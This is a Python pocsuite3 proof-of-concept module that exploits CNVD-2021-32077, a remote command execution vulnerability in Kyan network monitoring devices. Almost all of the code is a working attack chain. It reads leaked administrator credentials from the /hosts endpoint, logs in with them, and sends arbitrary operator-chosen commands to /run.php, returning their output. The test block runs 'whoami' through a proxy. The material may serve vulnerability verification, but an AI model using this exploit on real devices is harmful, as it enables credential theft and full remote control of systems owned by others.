import re

from pocsuite3.api import POCBase, register_poc, logger, requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString


class Poc(POCBase):
    cnvd = 'CNVD-2021-32077'
    name = 'Kyan 网络监控设备远程命令执行漏洞'
    appName = "Kyan"
    vulDate = '2021-06-03'
    vulType = "Remote Code Execute"
    OPTIONS = OrderedDict({"command": OptString('id', "自定义执行指令")})

    def _exploit(self, param=''):
        getinfo_url = urljoin(self.url, "/hosts")
        login_url = urljoin(self.url, "/login.php")
        rce_url = urljoin(self.url, "/run.php")
        header = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        s = requests.session()
        res = s.get(getinfo_url, headers=header, verify=False)
        if res.status_code == 200 and "UserName=" and "Password=" in res.text:
            login_info = res.text.replace("\n", " ").rstrip()
            logger.debug(f"login info:{login_info}")
            pattern1 = re.compile(f"UserName=(.*)")
            pattern2 = re.compile(f"Password=(.*)")
            Username = pattern1.findall(res.text)[0]
            Password = pattern2.findall(res.text)[0]
            data = f"user={Username}&passwd={Password}"
            s = requests.session()
            res1 = s.post(login_url, data=data, headers=header, verify=False)
            if res1.status_code == 200 and "login.php" not in res1.text:
                res2 = s.get(rce_url, headers=header, verify=False)
                if res2.status_code == 200 and "Shell Execute" in res2.text:
                    command = {
                        'command': param
                    }
                    res3 = s.post(rce_url, headers=header, data=command, verify=False)
                    if res3.status_code == 200:
                        soup = BeautifulSoup(res3.text, "lxml")
                        cmd_result = soup.find_all("textarea", attrs={"name": "textarea"})[0].string.strip()
                        return cmd_result
            else:
                logger.warning('Login Failed!')
        else:
            logger.warning('Login Info Get Failed!')

    def _attack(self):

        param = self.get_option('command')
        res = self._exploit(param)
        if res:
            result = {"VerifyInfo": {param: res}}
            return self.parse_output(result)


register_poc(Poc)

if __name__ == '__main__':
    import os

    os.environ.setdefault('http', 'socks5://127.0.0.1:10000')
    os.environ.setdefault('http', 'socks5://127.0.0.1:10000')
    poc = Poc()
    logger.setLevel(level='DEBUG')
    poc.set_option('url', 'http://127.0.0.1:800')
    poc.set_option('command', 'whoami')
    poc.execute(mode='attack')
